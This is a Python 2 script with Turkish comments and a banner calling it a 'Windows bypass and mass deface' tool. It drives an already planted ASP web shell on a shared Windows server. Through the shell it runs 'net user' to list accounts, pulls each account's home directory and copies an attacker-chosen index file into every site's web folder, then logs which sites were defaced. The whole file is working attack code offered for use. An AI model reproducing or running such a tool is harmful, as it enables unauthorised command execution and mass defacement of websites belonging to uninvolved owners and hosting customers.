# -*- coding: utf-8 -*-
import sys
import os
import requests
from bs4 import BeautifulSoup
reload(sys) 
sys.setdefaultencoding('utf-8')
os.system('cls' if os.name == 'nt' else 'clear')

class renkler:
    HEADER = '\033[95m'
    mavi = '\033[94m'
    yesil = '\033[92m'
    sari = '\033[93m'
    kirmizi = '\033[91m'
    beyaz = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
print renkler.yesil + r"""
####################################################################################
#                        Cüneyt Tanrısevr                                          #
#               Windows bypass ve mass deface v1.0                                 #
# Kullanimi = ilk once shel urlsini giriniz                                        #
# http://www.sheladresi.com/shelimiz/shel.asp gibi giriniz                         #
# serverin icindeki kopyalanacak (index olur baska bi dosya olur)dosyayi girini z  #                                
# D:\inetpub\dexmod\deneme.com.tr\www\index.html                                   # 
# son olarak ana dizini veya genel olarak hani klasore kopyanacaksa o yolu gir     #                                  
# \www\   veya \www\upload\ veya \www\tmp\ gibi gibi sitelerin anadizini ve -      #  
# ve sonraki istenidiginiz yolu giriniz                                            #
# Dosya islemi basarili olanlari siteler.txt kayit edecektir                       #
####################################################################################"""+renkler.beyaz
shell=raw_input(renkler.mavi+"shell url sini gir = "+renkler.beyaz)
shel=shell+"?cmd="
indexx=raw_input(renkler.mavi+"index veya dosya yolu = "+renkler.beyaz)
ek=raw_input(renkler.mavi+"ek dizini gir = "+renkler.beyaz)
Komut="COPY "
url = shel+"net user"
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
rq=requests.session()
rq.headers.update(headers)
sorgu=""
rea=rq.get(url)
son=rea.content
soup=BeautifulSoup(son,"html.parser")
dex= soup.find_all('p')
j=[]
j.append(dex[2])
j2=[]
j3=[]
j4=[]
j5=[]
j6=[]
j7=""
j8=[]
j9=[]
for i in j:
    kj= str(i).split("-------------------------------------------------------------------------------\r\n")
    j2.append(kj[1])

for i in j2:
   kl=str(i).replace("\r\n","")
   j3.append(kl)
j7=j3

#print tuple(j7)
for i in tuple(j7):
    kl=str(i).replace("          ",",")
    j4.append(kl)


for i in tuple(j4):
    kl=str(i).split(",")
    j5.append(kl)
print str(len(j5[0]))+" user mevcut"
say=0
for i in j5[0]:
    say+=1
    de=i.replace("   ","")
    ff=de.replace(" ","")
    if ff!='':
        j8.append(ff)

j9=j8[:-1]
yaz=open("siteler.txt","w")
yaz.close()
for i in j9:
    url = shel+"net user %s"%(i)
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
    rq=requests.session()
    rq.headers.update(headers)
    sorgu=""
    rea=rq.get(url)
    sona=rea.content
    soupp=BeautifulSoup(sona,"html.parser")
    dexp= soupp.find_all('p')
    tt=[]
    for i in dexp[2]:
        ii=str(i).decode("utf-8")
        tt.append(ii)
    tt1=[]
    for k in tt:
        cj= k.split("directory")
        tt1.append(cj)
    tt2=[]
    tt2.append(cj[1])
    tt3=[]
    for i in tt2:
        ch=i.split("\r\nLast logon")
        tt3.append(ch)
    tt4=[]
    tt4.append(tt3[0][0])
    tt5=[]
    for i in tt4:
        jk=i.replace("               ","")
        tt5.append(jk)


    for i in tt5:
        kom= Komut+indexx+" "+i+ek
        urrl = shel+"%s"%(kom)
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
        rq=requests.session()
        rq.headers.update(headers)
        rea=rq.get(urrl)
        sonic= rea.content
        if "1 file(s) copied" in sonic:
            print renkler.yesil+"kopyalama basarili = %s"%(i)+renkler.beyaz
            yaz=open("siteler.txt","a")
            yaz.write(i+"\n")
            yaz.close()
        if "0 file(s) copied" in sonic:
            print renkler.kirmizi+"basarisiz"+renkler.beyaz
print renkler.yesil+"upload basarili olanlari  siteler.txt kayit edilmistir."+renkler.beyaz


